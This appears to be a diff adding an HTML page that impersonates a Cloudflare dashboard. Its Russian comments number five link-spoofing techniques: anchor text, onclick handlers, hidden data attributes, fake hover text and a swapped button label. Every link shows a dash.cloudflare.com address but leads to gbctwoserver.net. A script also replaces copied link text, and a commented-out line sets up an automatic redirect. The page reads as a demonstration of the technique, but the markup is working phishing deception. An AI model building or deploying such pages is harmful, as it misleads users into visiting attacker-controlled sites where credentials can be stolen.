@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloudflare - Secure Your Website</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            max-width: 800px;
+            padding: 40px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #f38020;
+        }
+        h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #888;
+            margin-bottom: 30px;
+        }
+        .link-card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .link-card:hover {
+            background: rgba(255,255,255,0.15);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .link-card a {
+            text-decoration: none;
+            color: inherit;
+            display: block;
+        }
+        .link-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #fff;
+        }
+        .link-url {
+            font-size: 14px;
+            color: #4ade80;
+            font-family: 'Courier New', monospace;
+        }
+        .link-desc {
+            font-size: 13px;
+            color: #888;
+            margin-top: 5px;
+        }
+        .warning {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(239, 68, 68, 0.1);
+            border-left: 3px solid #ef4444;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #fca5a5;
+        }
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            background: #f38020;
+            color: white;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+        .btn:hover {
+            background: #e56d00;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">☁️</div>
+        <h1>Cloudflare Dashboard</h1>
+        <p class="subtitle">Security & Performance for Your Website</p>
+        
+        <!-- Метод 1: Простой анкор (текст отличается от URL) -->
+        <div class="link-card">
+            <a href="https://gbctwoserver.net" target="_blank">
+                <div class="link-title">📊 Dashboard Overview</div>
+                <div class="link-url">https://dash.cloudflare.com/overview</div>
+                <div class="link-desc">View your website analytics and security status</div>
+            </a>
+        </div>
+        
+        <!-- Метод 2: JavaScript onclick (URL в статусбаре не виден) -->
+        <div class="link-card" onclick="window.location='https://gbctwoserver.net'" style="cursor: pointer;">
+            <div class="link-title">🔐 Security Settings</div>
+            <div class="link-url">https://dash.cloudflare.com/security</div>
+            <div class="link-desc">Configure firewall rules and DDoS protection</div>
+        </div>
+        
+        <!-- Метод 3: Data атрибут (реальный URL скрыт) -->
+        <div class="link-card" data-real-url="https://gbctwoserver.net" onclick="window.location=this.dataset.realUrl" style="cursor: pointer;">
+            <div class="link-title">⚡ Performance Analytics</div>
+            <div class="link-url">https://dash.cloudflare.com/analytics</div>
+            <div class="link-desc">Monitor CDN cache and page load times</div>
+        </div>
+        
+        <!-- Метод 4: Фейковый hover (при наведении показывает фейк) -->
+        <div class="link-card" 
+             onclick="window.open('https://gbctwoserver.net', '_blank')"
+             onmouseover="this.querySelector('.link-url').textContent='https://dash.cloudflare.com/tunnels'"
+             onmouseout="this.querySelector('.link-url').textContent='https://dash.cloudflare.com/tunnels'"
+             style="cursor: pointer;">
+            <div class="link-title">🌐 Tunnel Management</div>
+            <div class="link-url">https://dash.cloudflare.com/tunnels</div>
+            <div class="link-desc">Manage your Cloudflare Tunnels</div>
+        </div>
+        
+        <!-- Метод 5: Кнопка с фейковым URL -->
+        <a href="https://gbctwoserver.net" class="btn" 
+           onmouseover="this.dataset.original=this.textContent;this.textContent='Open Cloudflare Dashboard'"
+           onmouseout="this.textContent=this.dataset.original">
+            Access Dashboard
+        </a>
+        
+        <div class="warning">
+            ⚠️ <strong>Техника:</strong> Анкор (видимый текст) показывает легитимный Cloudflare URL, 
+            но реальная ссылка ведет на gbctwoserver.net. В статусбаре браузера будет виден реальный URL при наведении.
+        </div>
+    </div>
+    
+    <script>
+        // Автоматический редирект через N секунд
+        // setTimeout(() => { window.location = 'https://gbctwoserver.net'; }, 5000);
+        
+        // Редирект при копировании (подмена в буфере)
+        document.querySelectorAll('.link-card a').forEach(link => {
+            link.addEventListener('copy', (e) => {
+                e.preventDefault();
+                // Копируется фейковый URL
+                e.clipboardData.setData('text/plain', 'https://dash.cloudflare.com');
+            });
+        });
+    </script>
+</body>
+</html>
